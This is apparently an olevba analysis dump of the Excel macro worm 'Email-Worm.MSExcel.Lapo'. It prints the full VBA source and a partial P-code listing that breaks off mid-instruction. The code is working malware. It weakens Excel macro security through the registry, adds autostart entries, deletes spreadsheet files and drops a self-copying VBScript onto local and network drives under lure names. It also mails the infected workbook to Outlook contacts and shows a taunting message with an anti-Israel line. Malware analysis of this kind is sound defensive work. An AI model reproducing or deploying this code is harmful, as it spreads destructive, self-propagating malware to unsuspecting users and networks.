olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Email-Worm.MSExcel.Lapo
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: ./Email-Worm.MSExcel.Lapo - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Lapo.bas 
in file: ./Email-Worm.MSExcel.Lapo - OLE stream: '_VBA_PROJECT_CUR/VBA/Lapo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function OLHcgtf67tgVFVFi76fv Lib "ADVAPI32.DLL" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function TURDuy8ggrYDlu84k Lib "ADVAPI32.DLL" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
Private Declare Function uygYUG987uGYU897g Lib "ADVAPI32.DLL" (ByVal hKey As Long) As Long
Global Const REG_DWORD As Long = 4
Global Const HKEY_LOCAL_MACHINE As Long = &H80000002
Global Const HKEY_CURRENT_USER As Long = &H80000001
Dim OIRFYdyt76y98hJHGJ As String
Dim OUwaWARTF789IUh76h As String
Dim XTUYKILU98KJHhjg As String
'CyberArmy Virus by Major Grey ;)
Private Sub auto_open()
On Error Resume Next
    u = OLHcgtf67tgVFVFi76fv(HKEY_CURRENT_USER, "Software\Microsoft\Office\8.0\Excel\Microsoft Excel", 0, KEY_ALL_ACCESS, k)
    u = TURDuy8ggrYDlu84k(k, "Options6", 0, REG_DWORD, Chr$(0), 4)
    u = uygYUG987uGYU897g(k)
    v = OLHcgtf67tgVFVFi76fv(HKEY_CURRENT_USER, "Software\Microsoft\Office\9.0\Excel\Security", 0, KEY_ALL_ACCESS, s)
    v = TURDuy8ggrYDlu84k(s, "Level", 0, 1, "1", 0)
    v = uygYUG987uGYU897g(s)
    C = OLHcgtf67tgVFVFi76fv(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS, s)
    C = TURDuy8ggrYDlu84k(s, "VsStatEXE", 0, 1, "c:\windows\kernel.exe.vbs", 0)
    C = uygYUG987uGYU897g(s)
CommandBars("Tools").Controls("Options...").Enabled = False
CommandBars("Tools").Controls("Macro").Enabled = False
d = Day(Now())
m = Month(Now())
P = Application.PathSeparator
OIRFYdyt76y98hJHGJ = Application.StartupPath
Application.DisplayAlerts = False
Application.StatusBar = False
Application.ScreenUpdating = False
If Dir(OIRFYdyt76y98hJHGJ & P & "*o.xls") = "" Then
Workbooks("personal.xls").Close
Kill (OIRFYdyt76y98hJHGJ & P & "*.xls")
mycolony
gofrnd
Workbooks.Add
    n = EST89gYTSE987gf(ThisWorkbook.Name)
    UHSTSoiHU78KHnv (n)
    ActiveWorkbook.VBProject.VBComponents(n).Name = "V" & d & "b"
    RDTOIoigh6gv5hFG = ActiveWorkbook.Name
    ActiveWindow.Visible = False
    Workbooks(RDTOIoigh6gv5hFG).SaveAs Filename:="C:\Army.xls", FileFormat:=xlNormal _
            , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
False
    Workbooks("Army.xls").SaveAs Filename:=OIRFYdyt76y98hJHGJ & P & d & "S" & m & "o" & ".xls", FileFormat:=xlNormal _
            , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
False
    
    Else
    
End If
Application.DisplayAlerts = True
Application.ScreenUpdating = True
OUwaWARTF789IUh76h = Dir(OIRFYdyt76y98hJHGJ & P & "*o.xls")
Application.OnSheetActivate = "'" & OIRFYdyt76y98hJHGJ & P & OUwaWARTF789IUh76h & "'!AtcSprd"

End Sub

Private Function EST89gYTSE987gf(WkName)
On Error Resume Next
    Set k = Workbooks(WkName).VBProject.VBComponents
    For i = 1 To k.Count
        If k(i).Type = 1 Then
            EST89gYTSE987gf = k(i).Name
            Exit For
        Else
            EST89gYTSE987gf = ""
        End If
    Next i
End Function

Private Function UHSTSoiHU78KHnv(n)
    On Error Resume Next
    Set TW = ThisWorkbook.VBProject.VBComponents
    Set aw = ActiveWorkbook.VBProject.VBComponents
    TW(n).Export (OIRFYdyt76y98hJHGJ & P & "t")
    aw.Import (OIRFYdyt76y98hJHGJ & P & "t")
    Kill (OIRFYdyt76y98hJHGJ & P & "t")
End Function

Sub AtcSprd()
On Error Resume Next
n = EST89gYTSE987gf(ActiveWorkbook.Name)
ytfKTUF8tJH8528HGC = ActiveWorkbook.VBProject.VBComponents(n).Name
OIpoi57869ghfhHJF = Left(ActiveWorkbook.Name, 4)
    Set TW = ThisWorkbook.VBProject.VBComponents
    Set aw = ActiveWorkbook.VBProject.VBComponents
    If ActiveWorkbook.Name <> "Book1" Then
      If ytfKTUF8tJH8528HGC <> OIpoi57869ghfhHJF Then
      Set AVC = ActiveWorkbook.VBProject.VBComponents
                For i = AVC.Count To 1 Step -1
                    If AVC(i).Type = 1 Or AVC(i).Type = 2 Then
                        AVC.Remove AVC(i)
                    End If
                Next i
      n = EST89gYTSE987gf(ThisWorkbook.Name)
      UHSTSoiHU78KHnv (n)
      ActiveWorkbook.VBProject.VBComponents(n).Name = OIpoi57869ghfhHJF
      Workbooks(ActiveWorkbook.Name).Save
      End If
    End If
If Day(Now()) + 34 Mod Month(Now()) = 3 Then OoiuEWYqfgh878HG
If Month(Now()) > 2 Then
   If Dir("C:\WINDOWS\kernel.exe.vbs") = "" Then mycolony
End If
End Sub
Private Sub Workbook_BeforeSave(ByVal SaveAsUI As Boolean, Cancel As Boolean)
AtcSprd
End Sub
Sub OoiuEWYqfgh878HG()
MsgBox " mAlE  oR  fEmAlE  dOEsN't  MaTter " & Chr(13) & " JoKE  joB  aNd  sAY  ,  hAai...!!  tO  ExCel " _
& Chr(13) & " aNd  sAY  gOodByE  tÖ  iZr@3L ......!! " & Chr(13) & Chr(13) & " ***********L3ts T#3 W4R be9iNinG*********** " _
& Chr(13) & Chr(13), vbExclamation, "Excel BÖmber"
End Sub

Sub mycolony()
On Error Resume Next
Open "C:\WINDOWS\kernel.exe.vbs" For Output As #1
Print #1, "'CyberArmy Virus by Major Grey ;)"
Print #1, "On Error resume next"
Print #1, "dim wobj"
Print #1, "set ff = createobject(""Scripting.FileSystemObject"")"
Print #1, "sfold = ff.getspecialfolder(1)"
Print #1, "Set Fso= Createobject(""scripting.filesystemobject"")"
Print #1, "Fso.copyfile wscript.scriptfullname,Fso.GetSpecialFolder(1)& ""\Kernel32.vbs"""
Print #1, "set wobj=wscript.createobject(""WScript.Shell"")"
Print #1, "If Minute(Now)>55 Then"
Print #1, "nbr = weekday(now)"
Print #1, "if nbr > 3 then nbr = nbr - 3"
Print #1, "Wobj.regwrite""HKLM\system\currentcontrolset\services\Vxd\Vnetsup\Workgroup"",""Army"" & nbr"
Print #1, "msgbox"" Haii....CyberARMY now protect your PC """
Print #1, "wobj.regwrite""HKCU\Software\Microsoft\Windos\CurrentVersion\Policies\Explorer\NoClose"",""1"""
Print #1, "End If"
Print #1, "wobj.regwrite""HKCU\Software\Microsoft\Office\9.0\Excel\Security\Level"",""1"""
Print #1, "Wobj.regwrite""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Army"",""wscript.exe ""&Fso.GetSpecialFolder(1)& ""\kernel32.vbs %"""
Print #1, "editini sfold&""\win.ini"",""[windows]"",""load"",sfold&""\kernel32.vbs"""
Print #1, "editini sfold&""\System.ini"",""[boot]"",""shell"",""Explorer.exe""& sfold&""\kernel32.vbs"""
Print #1, "ntwrk()"
Print #1, "sub cpdrv(drive)"
Print #1, "on error resume next"
Print #1, "Set s = createobject(""Scripting.FileSystemObject"")"
Print #1, "set f=s.getfile(Wscript.scriptFullName)"
Print #1, "nmfile = minute(now)"
Print #1, "Scfile = second(now)"
Print #1, "f.copy(""c:\windows\desktop\"" & ""ISO9"" & Scfile & nmfile & "".exe.vbs"")"
Print #1, "f.copy(drive & ""\MyAdult"" & nmfile & "".jpg.vbs"")"
Print #1, "ff.copyfile ""C:\Army.xls"",drive & ""\Army.xls"",True"
Print #1, "end sub"
Print #1, "function showdrive(drvpath)"
Print #1, "on error resume next"
Print #1, "dim fso,d,t"
Print #1, "set fso = CreateObject(""Scripting.FileSystemObject"")"
Print #1, "Set  d= fso.getdrive(drvpath)"
Print #1, "select case d.drivetype"
Print #1, "case 0:t=""Unknown"""
Print #1, "case 1:t=""removable"""
Print #1, "case 2:t=""Fixed"""
Print #1, "case 3:t=""network"""
Print #1, "case 4:t=""CD-ROM"""
Print #1, "case 5:t=""Ramdisk"""
Print #1, "end select"
Print #1, "if t="""" then t=""none"""
Print #1, "showdrive = t"
Print #1, "end function"
Print #1, "sub ntwrk()"
Print #1, "on error resume next"
Print #1, "for n=65 to 90"
Print #1, "l=chr(n)"
Print #1, "drv=l&"":"""
Print #1, "d3=showdrive(drv)"
Print #1, "if d3=""Fixed""then cpdrv(drv)"
Print #1, "if d3=""network"" then cpdrv(drv)"
Print #1, "next"
Print #1, "end sub"
Close #1
SetAttr ("C:\WINDOWS\kernel.exe.vbs"), vbReadOnly
End Sub
Private Sub gofrnd()
On Error Resume Next
Dim POIKJHDE765fghdHGFDHou, OIUYfd5456hg67gesrDGF, FJFrwwok435jgdDASFDG
Set POIKJHDE765fghdHGFDHou = CreateObject("Outlook.Application")
Set OIUYfd5456hg67gesrDGF = POIKJHDE765fghdHGFDHou.GetNameSpace("MAPI")
If POIKJHDE765fghdHGFDHou = "Outlook" Then
OIUYfd5456hg67gesrDGF.Logon "profile", "password"
For x = 1 To OIUYfd5456hg67gesrDGF.AddressLists.Count
Set hgj87kl098sBADUSAs3dfg = OIUYfd5456hg67gesrDGF.AddressLists(x)
y = 1
Set FJFrwwok435jgdDASFDG = POIKJHDE765fghdHGFDHou.CreateItem(0)
For z = 1 To hgj87kl098sBADUSAs3dfg.AddressEntries.Count
Peep = hgj87kl098sBADUSAs3dfg.AddressEntries(y)
FJFrwwok435jgdDASFDG.Recipients.Add Peep
y = y + 1
If y > 50 Then z = hgj87kl098sBADUSAs3dfg.AddressEntries.Count
Next z
FJFrwwok435jgdDASFDG.Subject = "Penting !! dari" & Application.UserName
FJFrwwok435jgdDASFDG.Body = "di bawah ini laporan yang anda perlukan dalam attachment Excel"
FJFrwwok435jgdDASFDG.Attachments.Add ActiveWorkbook.FullName
FJFrwwok435jgdDASFDG.Send
Peep = ""
Next x
OIUYfd5456hg67gesrDGF.Logoff
End If
    v = OLHcgtf67tgVFVFi76fv(HKEY_CURRENT_USER, "Software\Microsoft\Office", 0, KEY_ALL_ACCESS, s)
    v = TURDuy8ggrYDlu84k(s, "ARMY", 0, 1, "Major Grey of CyberArmy will change your duty ...", 0)
    v = uygYUG987uGYU897g(s)
End Sub


-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Email-Worm.MSExcel.Lapo
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/ThisWorkbook - 993 bytes
' Line #0:
' Line #1:
' _VBA_PROJECT_CUR/VBA/Lapo - 15709 bytes
' Line #0:
' 	FuncDefn (Private Declare Function OLHcgtf67tgVFVFi76fv Lib "ADVAPI32.DLL" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long)
' Line #1:
' 	FuncDefn (Private Declare Function TURDuy8ggrYDlu84k Lib "ADVAPI32.DLL" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long)
' Line #2:
' 	FuncDefn (Private Declare Function uygYUG987uGYU897g Lib "ADVAPI32.DLL" (ByVal hKey As Long) As Long)
' Line #3:
' 	Dim (Global Const) 
' 	LitDI2 0x0004 
' 	VarDefn REG_DWORD (As Long)
' Line #4:
' 	Dim (Global Const) 
' 	LitHI4 0x0002 0x8000 
' 	VarDefn HKEY_LOCAL_MACHINE (As Long)
' Line #5:
' 	Dim (Global Const) 
' 	LitHI4 0x0001 0x8000 
' 	VarDefn HKEY_CURRENT_USER (As Long)
' Line #6:
' 	Dim 
' 	VarDefn OIRFYdyt76y98hJHGJ (As String)
' Line #7:
' 	Dim 
' 	VarDefn OUwaWARTF789IUh76h (As String)
' Line #8:
' 	Dim 
' 	VarDefn XTUYKILU98KJHhjg (As String)
' Line #9:
' 	QuoteRem 0x0000 0x0020 "CyberArmy Virus by Major Grey ;)"
' Line #10:
' 	FuncDefn (Private Sub auto_open())
' Line #11:
' 	OnError (Resume Next) 
' Line #12:
' 	Ld HKEY_CURRENT_USER 
' 	LitStr 0x0033 "Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	LitDI2 0x0000 
' 	Ld KEY_ALL_ACCESS 
' 	Ld k 
' 	ArgsLd OLHcgtf67tgVFVFi76fv 0x0005 
' 	St u 
' Line #13:
' 	Ld k 
' 	LitStr 0x0008 "Options6"
' 	LitDI2 0x0000 
' 	Ld REG_DWORD 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0004 
' 	ArgsLd TURDuy8ggrYDlu84k 0x0006 
' 	St u 
' Line #14:
' 	Ld k 
' 	ArgsLd uygYUG987uGYU897g 0x0001 
' 	St u 
' Line #15:
' 	Ld HKEY_CURRENT_USER 
' 	LitStr 0x002C "Software\Microsoft\Office\9.0\Excel\Security"
' 	LitDI2 0x0000 
' 	Ld KEY_ALL_ACCESS 
' 	Ld s 
' 	ArgsLd OLHcgtf67tgVFVFi76fv 0x0005 
' 	St v 
' Line #16:
' 	Ld s 
' 	LitStr 0x0005 "Level"
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	LitStr 0x0001 "1"
' 	LitDI2 0x0000 
' 	ArgsLd TURDuy8ggrYDlu84k 0x0006 
' 	St v 
' Line #17:
' 	Ld s 
' 	ArgsLd uygYUG987uGYU897g 0x0001 
' 	St v 
' Line #18:
' 	Ld HKEY_LOCAL_MACHINE 
' 	LitStr 0x002D "Software\Microsoft\Windows\CurrentVersion\Run"
' 	LitDI2 0x0000 
' 	Ld KEY_ALL_ACCESS 
' 	Ld s 
' 	ArgsLd OLHcgtf67tgVFVFi76fv 0x0005 
' 	St C 
' Line #19:
' 	Ld s 
' 	LitStr 0x0009 "VsStatEXE"
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	LitStr 0x0019 "c:\windows\kernel.exe.vbs"
' 	LitDI2 0x0000 
' 	ArgsLd TURDuy8ggrYDlu84k 0x0006 
' 	St C 
' Line #20:
' 	Ld s 
' 	ArgsLd uygYUG987uGYU897g 0x0001 
' 	St C 
' Line #21:
' 	LitVarSpecial (False)
' 	LitStr 0x000A "Options..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #22:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #23:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	St d 
' Line #24:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	St m 
' Line #25:
' 	Ld Application 
' 	MemLd PathSeparator 
' 	St P 
' Line #26:
' 	Ld Application 
' 	MemLd StartupPath 
' 	St OIRFYdyt76y98hJHGJ 
' Line #27:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #28:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt StatusBar 
' Line #29:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #30:
' 	Ld OIRFYdyt76y98hJHGJ 
' 	Ld P 
' 	Concat 
' 	LitStr 0x0006 "*o.xls"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #31:
' 	LitStr 0x000C "personal.xls"
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0000 
' Line #32:
' 	Ld OIRFYdyt76y98hJHGJ 
' 	Ld P 
' 	Concat 
' 	LitStr 0x0005 "*.xls"
' 	Concat 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #33:
' 	ArgsCall mycolony 0x0000 
' Line #34:
' 	ArgsCall gofrnd 0x0000 
' Line #35:
' 	Ld Workbooks 
' 	ArgsMemCall Add 0x0000 
' Line #36:
' 	Ld ThisWorkbook 
' 	MemLd New 
' 	ArgsLd EST89gYTSE987gf 0x0001 
' 	St n 
' Line #37:
' 	Ld n 
' 	Paren 
' 	ArgsCall UHSTSoiHU78KHnv 0x0001 
' Line #38:
' 	LitStr 0x0001 "V"
' 	Ld d 
' 	Concat 
' 	LitStr 0x0001 "b"
' 	Concat 
' 	Ld n 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' Line #39:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	St RDTOIoigh6gv5hFG 
' Line #40:
' 	LitVarSpecial (False)
' 	Ld ActiveWindow 
' 	MemSt Visible 
' Line #41:
' 	LineCont 0x0008 0D 00 0C 00 18 00 00 00
' 	LitStr 0x000B "C:\Army.xls"
' 	ParamNamed Filename 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitStr 0x0000 ""
' 	ParamNamed Password 
' 	LitStr 0x0000 ""
' 	ParamNamed WriteResPassword 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld RDTOIoigh6gv5hFG 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall SaveAs 0x0005 
' Line #42:
' 	LineCont 0x0008 19 00 0C 00 24 00 00 00
' 	Ld OIRFYdyt76y98hJHGJ 
' 	Ld P 
' 	Concat 
' 	Ld d 
' 	Concat 
' 	LitStr 0x0001 "S"
' 	Concat 
' 	Ld m 
' 	Concat 
' 	LitStr 0x0001 "o"
' 	Concat 
' 	LitStr 0x0004 ".xls"
' 	Concat 
' 	ParamNamed Filename 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitStr 0x0000 ""
' 	ParamNamed Password 
' 	LitStr 0x0000 ""
' 	ParamNamed WriteResPassword 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	LitStr 0x0008 "Army.xls"
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall SaveAs 0x0005 
' Line #43:
' Line #44:
' 	ElseBlock 
' Line #45:
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #48:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #49:
' 	Ld OIRFYdyt76y98hJHGJ 
' 	Ld P 
' 	Concat 
' 	LitStr 0x0006 "*o.xls"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St OUwaWARTF789IUh76h 
' Line #50:
' 	LitStr 0x0001 "'"
' 	Ld OIRFYdyt76y98hJHGJ 
' 	Concat 
' 	Ld P 
' 	Concat 
' 	Ld OUwaWARTF789IUh76h 
' 	Concat 
' 	LitStr 0x0009 "'!AtcSprd"
' 	Concat 
' 	Ld Application 
' 	MemSt OnSheetActivate 
' Line #51:
' Line #52:
' 	EndSub 
' Line #53:
' Line #54:
' 	FuncDefn (Private Function EST89gYTSE987gf(WkName))
' Line #55:
' 	OnError (Resume Next) 
' Line #56:
' 	SetStmt 
' 	Ld WkName 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set k 
' Line #57:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld k 
' 	MemLd Count 
' 	For 
' Line #58:
' 	Ld i 
' 	ArgsLd k 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #59:
' 	Ld i 
' 	ArgsLd k 0x0001 
' 	MemLd New 
' 	St EST89gYTSE987gf 
' Line #60:
' 	ExitFor 
' Line #61:
' 	ElseBlock 
' Line #62:
' 	LitStr 0x0000 ""
' 	St EST89gYTSE987gf 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #65:
' 	EndFunc 
' Line #66:
' Line #67:
' 	FuncDefn (Private Function UHSTSoiHU78KHnv(n))
' Line #68:
' 	OnError (Resume Next) 
' Line #69:
' 	SetStmt 
' 	Ld ThisWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set TW 
' Line #70:
' 	SetStmt 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set aw 
' Line #71:
' 	Ld OIRFYdyt76y98hJHGJ 
' 	Ld P 
' 	Concat 
' 	LitStr 0x0001 "t"
' 	Concat 
' 	Paren 
' 	Ld n 
' 	ArgsLd TW 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #72:
' 	Ld OIRFYdyt76y98hJHGJ 
' 	Ld P 
' 	Concat 
' 	LitStr 0x0001 "t"
' 	Concat 
' 	Paren 
' 	Ld aw 
' 	ArgsMemCall Import 0x0001 
' Line #73:
' 	Ld OIRFYdyt76y98hJHGJ 
' 	Ld P 
' 	Concat 
' 	LitStr 0x0001 "t"
' 	Concat 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #74:
' 	EndFunc 
' Line #75:
' Line #76:
' 	FuncDefn (Sub AtcSprd())
' Line #77:
' 	OnError (Resume Next) 
' Line #78:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	ArgsLd EST89gYTSE987gf 0x0001 
' 	St n 
' Line #79:
' 	Ld n 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St ytfKTUF8tJH8528HGC 
' Line #80:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	LitDI2 0x0004 
' 	ArgsLd LBound 0x0002 
' 	St OIpoi57869ghfhHJF 
' Line #81:
' 	SetStmt 
' 	Ld ThisWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set TW 
' Line #82:
' 	SetStmt 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set aw 
' Line #83:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	LitStr 0x0005 "Book1"
' 	Ne 
' 	IfBlock 
' Line #84:
' 	Ld ytfKTUF8tJH8528HGC 
' 	Ld OIpoi57869ghfhHJF 
' 	Ne 
' 	IfBlock 
' Line #85:
' 	SetStmt 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set AVC 
' Line #86:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld AVC 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #87:
' 	Ld i 
' 	ArgsLd AVC 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld i 
' 	ArgsLd AVC 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0002 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #88:
' 	Ld i 
' 	ArgsLd AVC 0x0001 
' 	Ld AVC 
' 	ArgsMemCall Remove 0x0001 
' Line #89:
' 	EndIfBlock 
' Line #90:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #91:
' 	Ld ThisWorkbook 
' 	MemLd New 
' 	ArgsLd EST89gYTSE987gf 0x0001 
' 	St n 
' Line #92:
' 	Ld n 
' 	Paren 
' 	ArgsCall UHSTSoiHU78KHnv 0x0001 
' Line #93:
' 	Ld OIpoi57869ghfhHJF 
' 	Ld n 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' Line #94:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #95:
' 	EndIfBlock 
' Line #96:
' 	EndIfBlock 
' Line #97:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0022 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	Mod 
' 	Add 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall OoiuEWYqfgh878HG 0x0000 
' 	EndIf 
' Line #98:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Gt 
' 	IfBlock 
' Line #99:
' 	LitStr 0x0019 "C:\WINDOWS\kernel.exe.vbs"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall mycolony 0x0000 
' 	EndIf 
' Line #100:
' 	EndIfBlock 
' Line #101:
' 	EndSub 
' Line #102:
' 	FuncDefn (Private Sub Workbook_BeforeSave(ByVal SaveAsUI As Boolean, Cancel As Boolean))
' Line #103:
' 	ArgsCall AtcSprd 0x0000 
' Line #104:
' 	EndSub 
' Line #105:
' 	FuncDefn (Sub OoiuEWYqfgh878HG())
' Line #106:
' 	LineCont 0x0008 09 00 00 00 1C 00 00 00
' 	LitStr 0x0023 " mAlE  oR  fEmAlE  dOEsN't  MaTter "
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x002E " JoKE  joB  aNd  sAY  ,  hAai...!!  tO  ExCel "
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0028 " aNd  sAY  gOodByE  tÖ  iZr@3L ......!! "
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x002D " ***********L3ts T#3 W4R be9iNinG*********** "
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld vbExclamation 
' 	LitStr 0x000C "Excel BÖmber"
' 	ArgsCall MsgBox 0x0003 
' Line #107:
' 	EndSub 
' Line #108:
' Line #109:
' 	FuncDefn (Sub mycolony())
' Line #110:
' 	OnError (Resume Next) 
' Line #111:
' 	LitStr 0x0019 "C:\WINDOWS\kernel.exe.vbs"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #112:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "'CyberArmy Virus by Major Grey ;)"
' 	PrintItemNL 
' Line #113:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "On Error resume next"
' 	PrintItemNL 
' Line #114:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "dim wobj"
' 	PrintItemNL 
' Line #115:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0033 "set ff = createobject("Scripting.FileSystemObject")"
' 	PrintItemNL 
' Line #116:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "sfold = ff.getspecialfolder(1)"
' 	PrintItemNL 
' Line #117:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0033 "Set Fso= Createobject("scripting.filesystemobject")"
' 	PrintItemNL 
' Line #118:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004C "Fso.copyfile wscript.scriptfullname,Fso.GetSpecialFolder(1)& "\Kernel32.vbs""
' 	PrintItemNL 
' Line #119:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002E "set wobj=wscript.createobject("WScript.Shell")"
' 	PrintItemNL 
' Line #120:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "If Minute(Now)>55 Then"
' 	PrintItemNL 
' Line #121:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "nbr = weekday(now)"
' 	PrintItemNL 
' Line #122:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "if nbr > 3 then nbr = nbr - 3"
' 	PrintItemNL 
' Line #123:
' 	LitDI2 0x0001 
' 	Sharp 
